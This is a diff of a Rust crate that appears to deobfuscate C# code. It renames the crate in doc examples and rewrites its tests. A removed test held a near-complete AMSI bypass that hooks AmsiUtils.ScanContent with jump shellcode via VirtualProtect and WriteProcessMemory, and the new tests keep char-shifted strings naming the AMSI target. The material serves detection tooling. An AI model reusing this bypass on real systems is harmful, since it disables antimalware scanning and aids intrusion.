@@ -19,7 +19,7 @@
 //! ## Usage
 //!
 //! ```rust
-//! use ps_parser::CSharpSession;
+//! use cs_parser::CSharpSession;
 //!
 //! let mut session = CSharpSession::new();
 //! let output = session.safe_eval(r#"$a = 42; Write-Output $a"#).unwrap();
@@ -36,7 +36,7 @@ mod parser;
 /// # Examples
 ///
 /// ```rust
-/// use ps_parser::CSharpSession;
+/// use cs_parser::CSharpSession;
 ///
 /// // Create a new session
 /// let mut session = CSharpSession::new();
@@ -60,7 +60,7 @@ pub(crate) use parser::NEWLINE;
 /// # Examples
 ///
 /// ```rust
-/// use ps_parser::CSharpSession;
+/// use cs_parser::CSharpSession;
 ///
 /// let mut session = CSharpSession::new();
 /// let program_result = session.parse_input("$a = 42; $a").unwrap();
@@ -79,7 +79,7 @@ pub use parser::ProgramResult;
 /// # Examples
 ///
 /// ```rust
-/// use ps_parser::PsValue;
+/// use cs_parser::PsValue;
 ///
 /// // Different value types  
 /// let int_val = PsValue::Int(42);
@@ -108,7 +108,7 @@ pub use parser::PsValue;
 /// # Examples
 ///
 /// ```rust
-/// use ps_parser::CSharpSession;
+/// use cs_parser::CSharpSession;
 ///
 /// let mut session = CSharpSession::new();
 /// let program_result = session.parse_input("$var = 123").unwrap();
@@ -128,7 +128,7 @@ pub use parser::Token;
 /// # Examples
 ///
 /// ```rust
-/// use ps_parser::{Variables, CSharpSession};
+/// use cs_parser::{Variables, CSharpSession};
 /// use std::path::Path;
 ///
 /// // Load environment variables
@@ -148,10 +148,7 @@ pub use parser::{ExpressionToken, FunctionToken, MethodToken, StringExpandableTo
 
 #[cfg(test)]
 mod tests {
-    use std::collections::HashMap;
-
     use super::*;
-    use crate::{ExpressionToken, StringExpandableToken};
 
     //     #[test]
     //     fn deobfuscation() {
@@ -1207,7 +1204,7 @@ namespace Test
     }
 
     #[test]
-    fn obfuscation_clr_hooking_short() {
+    fn obfuscation_clr_hooking_string_append() {
         let mut p = CSharpSession::new();
 
         let input = r#"
@@ -1215,20 +1212,39 @@ namespace Editor {
     public static class Methods {
         
         private static string Transform2(string in) {
-            StringBuilder builder = new StringBuilder(in + "Content");    
+            StringBuilder builder = new StringBuilder(in + "Conten");    
             builder.Append('t');
             return builder.ToString();
         }
-        //private static readonly string CLASS1 = Methods.Transform("Scan");
         private static readonly string CLASS1 = Methods.Transform2("Scan");
-        //private static readonly string CLASS2 = Methods.Transform2("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt");
     }
 }"#;
 
         let program_res = p.parse_input(input).unwrap();
-        println!("Erros: {:?}", program_res.errors());
-        //println!("{:?}", program_res.tokens());
         assert!(program_res.tokens().string_set().contains("ScanContent"));
+    }
+
+    #[test]
+    fn obfuscation_clr_hooking_foreach() {
+        let mut p = CSharpSession::new();
+
+        let input = r#"
+namespace Editor {
+    public static class Methods {
+        
+        private static string Transform(string input) {
+            StringBuilder builder = new StringBuilder(input.Length + 1);    
+            foreach(char c in input) {
+                char m = (char)((int)c - 1);
+                builder.Append(m);
+            }
+            return builder.ToString();
+        }
+        private static readonly string CLASS = Methods.Transform("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt");
+    }
+}"#;
+
+        let program_res = p.parse_input(input).unwrap();
         assert!(
             program_res
                 .tokens()
@@ -1238,101 +1254,26 @@ namespace Editor {
     }
 
     #[test]
-    fn obfuscation_clr_hooking_long() {
+    fn simple() {
         let mut p = CSharpSession::new();
 
         let input = r#"
-using System;
-using System.ComponentModel;
-using System.Management.Automation;
-using System.Reflection;
-using System.Runtime.CompilerServices;
-using System.Runtime.InteropServices;
-using System.Text;
-namespace Editor {
-    public static class Methods {
-        public static void Patch() {
-            MethodInfo original = typeof(PSObject).Assembly.GetType(Methods.CLASS).GetMethod(Methods.METHOD, BindingFlags.NonPublic | BindingFlags.Static);
-            MethodInfo replacement = typeof(Methods).GetMethod("Dummy", BindingFlags.NonPublic | BindingFlags.Static);
-            Methods.Patch(original, replacement);
+namespace Some {
+    class Main {
+        public static string SUSPICIOUS = Main.InitText("concatenated", "string");
+        public static string InitText(string prefix, string suffix) {
+            return prefix + "_" + suffix;
         }
-        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
-        private static int Dummy(string content, string metadata) {
-            return 1;
-        }
-        public static void Patch(MethodInfo original, MethodInfo replacement) {
-            //JIT compile methods
-            RuntimeHelpers.PrepareMethod(original.MethodHandle);
-            RuntimeHelpers.PrepareMethod(replacement.MethodHandle);
-            //Get pointers to the functions
-            IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
-            IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();
-            //Generate architecture specific shellcode
-            byte[] patch = null;
-            if (IntPtr.Size == 8) {
-                patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };
-                byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
-                for (int i = 0; i < address.Length; i++) {
-                    patch[i + 2] = address[i];
-                }
-            } else {
-                patch = new byte[] { 0x68, 0x0, 0x0, 0x0, 0x0, 0xc3 };
-                byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
-                for (int i = 0; i < address.Length; i++) {
-                    patch[i + 1] = address[i];
-                }
-            }
-            //Temporarily change permissions to RWE
-            uint oldprotect;
-            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) {
-                throw new Win32Exception();
-            }
-            //Apply the patch
-            IntPtr written = IntPtr.Zero;
-            if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, patch, (uint)patch.Length, out written)) {
-                throw new Win32Exception();
-            }
-            //Flush insutruction cache to make sure our new code executes
-            if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)patch.Length)) {
-                throw new Win32Exception();
-            }
-            //Restore the original memory protection settings
-            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, oldprotect, out oldprotect)) {
-                throw new Win32Exception();
-            }
-        }
-        private static string Transform(string input) {
-            StringBuilder builder = new StringBuilder(input.Length + 1);    
-            foreach(char c in input) {
-                char m = (char)((int)c - 1);
-                builder.Append(m);
-            }
-            return builder.ToString();
-        }
-        private static string Transform1(string input) {
-            return input+"Content";
-        }
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr GetCurrentProcess();
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
-        private static readonly string CLASS1 = Methods.Transform1("Scan");
-        private static readonly string CLASS = Methods.Transform("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt");
-        private static readonly string METHOD = Methods.Transform("TdboDpoufou");
     }
-}"#;
+}
+        "#;
 
         let program_res = p.parse_input(input).unwrap();
-        assert!(program_res.tokens().string_set().contains("ScanContent"));
         assert!(
             program_res
                 .tokens()
                 .string_set()
-                .contains("System.Management.Automation.AmsiUtils")
+                .contains("concatenated_string")
         );
     }
 }
